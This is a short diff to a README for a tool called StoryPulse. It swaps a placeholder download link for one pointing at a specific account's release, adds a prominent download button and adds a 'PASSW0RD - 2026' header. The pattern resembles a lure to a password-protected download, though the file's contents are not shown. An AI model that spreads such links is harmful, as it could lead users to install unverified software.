@@ -6,7 +6,7 @@
 
   <br>
 
-  <a href="https://github.com/yourusername/storypulse/releases/latest">
+  <a href="https://github.com/ColonyChandlerEstate/StoryPulse-make-your-story-better/releases/tag/storypulse">
     <img src="https://img.shields.io/badge/Download%20Now%20—%20Free%2C%20Offline%2C%20No%20Account-v1.0-ff2d75?style=for-the-badge&logo=download&logoColor=white&color=ec4899" height="48">
   </a>
 
@@ -67,6 +67,16 @@ While others struggle with CapCut templates, you’re already posting.
 - Windows 10/11  
 - macOS Monterey+ (Intel & Apple Silicon)  
 - Linux (Ubuntu, Fedora, Arch)
+
+--- 
+
+<div align="center">
+  <a href="https://github.com/ColonyChandlerEstate/StoryPulse-make-your-story-better/releases/tag/storypulse">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSW0RD - 2026 
 
 ---
 
